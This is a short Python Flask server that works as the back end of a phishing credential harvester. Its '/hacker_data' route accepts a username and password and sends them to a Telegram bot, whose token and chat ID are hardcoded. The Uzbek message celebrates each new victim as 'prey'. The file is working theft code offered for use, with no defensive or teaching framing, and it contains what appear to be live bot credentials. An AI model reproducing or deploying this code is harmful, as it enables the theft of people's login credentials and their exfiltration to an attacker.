from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)


BOT_TOKEN = "8383717818:AAFafG1Aa74Fapp1Z4asWhCQnoyi2BDsHio"
CHAT_ID = "6833584672"

def send_to_telegram(login, password):
    text = f"🔥 YANGI O'LJA TUSHDI!\n\n👤 Login: {login}\n🔑 Parol: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {"chat_id": CHAT_ID, "text": text}
    try:
        requests.get(url, params=params)
    except Exception as e:
        print(f"Xato: {e}")

@app.route('/')
def home():
    return render_template('index.html')
@app.route('/hacker_data', methods=['POST'])
def hacker_data():
    data = request.json
    if data:
        send_to_telegram(data.get('username'), data.get('password'))
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(debug=True, port=8080)